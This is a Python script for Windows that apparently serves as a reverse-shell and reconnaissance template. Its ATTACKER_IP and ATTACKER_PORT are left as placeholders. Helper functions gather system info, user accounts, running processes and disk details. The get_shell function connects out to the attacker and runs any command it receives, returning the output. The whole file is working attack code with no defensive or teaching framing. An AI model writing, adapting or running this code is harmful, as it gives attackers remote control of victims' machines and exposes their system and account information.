import os
import socket
import ctypes
import subprocess

ATTACKER_IP = "CHANGE"  
ATTACKER_PORT = CHANGE   

kernel32 = ctypes.windll.kernel32
pid = os.getpid()
process_handle = kernel32.OpenProcess(0x1F0FFF, False, pid)     

def get_system_info():
    os.system("systeminfo")

def get_net_user():
    os.system("net user")
    
def get_proc():
    task_list = subprocess.run("tasklist", capture_output=True, shell=True)
    output = task_list.stdout.decode('UTF-8', errors='ignore')
    print(output)

def get_stor_info():
    disk_info = subprocess.run("wmic logicaldisk get size, caption, freespace", capture_output=True, text=True, shell=True)
    print(disk_info.stdout)

def get_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ATTACKER_IP, ATTACKER_PORT))

    while True:
        s.send(b"$Shell: ") 
        cmd = s.recv(1024).decode().strip()
        if cmd.lower() in ('exit', 'quit'):
            break
        try:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            output = e.output
        s.send(output)

    s.close()

#system_info = get_system_info()
#net_user_info = get_net_user()
#proc = get_proc()
#storage = get_stor_info()
#shell = get_shell()
